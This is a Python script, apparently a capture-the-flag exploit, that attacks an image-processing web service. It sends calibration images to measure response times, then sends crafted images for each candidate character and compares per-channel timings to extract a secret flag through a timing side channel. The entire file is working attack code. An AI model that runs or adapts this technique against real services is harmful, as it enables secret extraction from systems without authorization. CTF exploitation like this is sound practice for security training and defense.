#!/usr/bin/env python3
from __future__ import print_function
from sys import argv, stderr
import requests
import json

addr = argv[1]

print("Get kernels list...")
url = 'http://%s/list' % addr
r = requests.get(url)
if r.status_code != 200:
	print("Status code %d" % r.status_code)
	exit(1)

someId = r.text.splitlines()[0]
print("Got some kernel id: " + someId)

#
print("Post calibration images to determine average time with and without penalty...")
url = 'http://%s/process?kernel-id=%s' % (addr, someId)
files = {'image0' : open("pngs/white.png", 'rb').read(), 'image1' : open("pngs/white.png", 'rb').read(), 'image2' : open("pngs/black0.png", 'rb').read(), 'image3' : open("pngs/black0.png", 'rb').read()}
r = requests.post(url, files=files)
if r.status_code != 200:
	print("Status code %d" % r.status_code)
	exit(1)

print(r.text)
timings = json.loads(r.text)
average  = timings['image0']['red_channel']
average += timings['image0']['green_channel']
average += timings['image0']['blue_channel']
average += timings['image0']['alpha_channel']
average += timings['image1']['red_channel']
average += timings['image1']['green_channel']
average += timings['image1']['blue_channel']
average += timings['image1']['alpha_channel']
noPenaltyAverage = average / 8.0
print("Average time without penalty = %f" % noPenaltyAverage)

average  = timings['image2']['red_channel']
average += timings['image2']['green_channel']
average += timings['image2']['blue_channel']
average += timings['image2']['alpha_channel']
average += timings['image3']['red_channel']
average += timings['image3']['green_channel']
average += timings['image3']['blue_channel']
average += timings['image3']['alpha_channel']
penaltyAverage = average / 8.0
print("Average time with penalty = %f" % penaltyAverage)

mean = (penaltyAverage - noPenaltyAverage) / 2.0 + noPenaltyAverage
dispersion = (penaltyAverage - noPenaltyAverage) * 0.1
print("Mean = %f" % mean)
print("Dispersion = %f" % dispersion)

#
kAlphabet = ['0', '1', '2', '3', '4', '5', '6', '7', '8', '9', '=', 'A', 'B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z']
flag = ""
for byteIdx in range(0,4):
	batch = {}
	for	s in kAlphabet:
		batch["%u_%s" % (byteIdx, s)] = open("pngs/%u_%s.png" % (byteIdx, s), 'rb').read()
	
	url = 'http://%s/process?kernel-id=%s' % (addr, someId)
	r = requests.post(url, files=batch)
	if r.status_code != 200:
		print("Status code %d" % r.status_code)
		exit(1)

	j = json.loads(r.text)

	channelIdx = byteIdx / 4
	if channelIdx == 0:
		channelName = 'red_channel'
	elif channelIdx == 1:
		channelName = 'green_channel'
	elif channelIdx == 2:
		channelName = 'blue_channel'
	elif channelIdx == 3:
		channelName = 'alpha_channel'

	timings = ""
	for	s in kAlphabet:
		name = "%u_%s" % (byteIdx, s)
		timings += s + " : " + str(j[name][channelName]) + " "
	print(timings)

	for	s in kAlphabet:
		name = "%u_%s" % (byteIdx, s)
		if abs(j[name][channelName] - mean) < dispersion:
			flag += s
			break

print(flag)
